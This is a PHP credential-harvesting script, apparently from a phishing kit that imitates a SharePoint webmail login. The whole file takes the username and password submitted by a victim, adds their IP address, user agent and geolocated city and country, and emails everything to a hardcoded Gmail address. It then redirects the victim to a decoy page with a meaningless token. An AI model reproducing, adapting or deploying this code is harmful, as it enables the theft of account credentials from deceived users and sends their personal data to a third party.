<?php 
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$agent=$_SERVER['HTTP_USER_AGENT'];
$email= "kbabone007@gmail.com";
$ip = getenv("REMOTE_ADDR");
$message  = "==================+[ Personal Info - Sharepoint - Webmail]+==================\n";
$message .= "Email Address : ".$_POST['UserName']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ [Sharepoint - Webmail] +=============\n";
$subject = "Sharepoint - Logs Webmail #1";
mail($email,$subject,$message);

header('Location: valid.php?src=DluZDluZHNmNDBlb2RzaDluZHNmNDDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbHNmNDBlb2RzaTRDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbpZWprMzBka2prZWtjamtkIGNuZmk0bmZpbZWppZXdpb2U5NDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpb25ja29uc2NrIGtjIGtqIHZqayBj&email=');
?>



